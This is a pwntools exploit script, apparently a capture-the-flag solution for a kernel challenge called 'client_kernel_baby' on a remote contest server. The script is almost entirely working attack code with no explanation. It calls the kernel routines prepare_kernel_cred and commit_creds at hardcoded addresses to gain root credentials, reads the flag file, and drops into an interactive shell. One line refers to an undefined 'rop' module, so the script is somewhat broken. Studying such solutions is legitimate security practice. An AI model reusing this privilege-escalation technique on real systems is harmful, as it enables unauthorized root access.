from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "arcade.fluxfingers.net"
remote_port = 1817

local_addr = "127.0.0.1"
local_port = 1807

pc = "./client_kernel_baby"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x1053+0x555555554000\nb *0xc3c+0x555555554000\n b *0x1235+0x555555554000')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)

def sl(a):
	p.sendline(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def call(addr,argu):
	sla('Bye!','1')
	sl(str(addr))
	sl(str(argu))

def id():
	sla('Bye!','2')

def read_flag(path):
	sla('Bye!','3')
	sl(path)

def hack():
	raw_input()
	prepare_kernel_cred = 0xFFFFFFFF8104ee50
	commit_creds = 0xFFFFFFFF8104e9d0
	call(prepare_kernel_cred,0)
	ru('It is: ')
	addr = int(rv(16),16)
	lg('addr',addr)
	call(commit_creds,addr)
	id()
	read_flag('flag')
	p.interactive()
hack()
